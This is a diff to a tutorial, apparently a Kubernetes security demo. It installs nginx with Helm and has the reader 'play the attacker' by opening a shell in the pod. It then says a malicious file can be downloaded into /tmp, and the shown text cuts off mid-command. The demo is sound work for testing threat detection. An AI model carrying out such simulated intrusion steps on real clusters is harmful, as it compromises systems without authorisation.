@@ -5,11 +5,15 @@ Let's use Helm to install a nginx container:
 `helm repo add bitnami https://charts.bitnami.com
 helm install --name example bitnami/nginx`
 
-You can check that the container is running, and its name by running  
-`kubectl get po -l app=example-nginx`
+You can check that the container is running, and the name of the pod by running  
+`kubectl get pod -l app=example-nginx`
 
 Now let's play the attacker, and spawn a shell:  
-`kubectl exec -it YOUR_POD_NAME -c example-nginx -- /bin/bash`
+`kubectl exec -it YOUR_POD_NAME -c example-nginx -- /bin/bash`  
+You can get the value of `YOUR_POD_NAME` from the previous command.
+
+You will be presented with a command prompt similar to this:  
+`I have no name!@example-nginx-769dfcf684-l4m67:/app$`
 
 You can execute a few commands inside the container, or even download some malicious file.  
 `cd /tmp &&
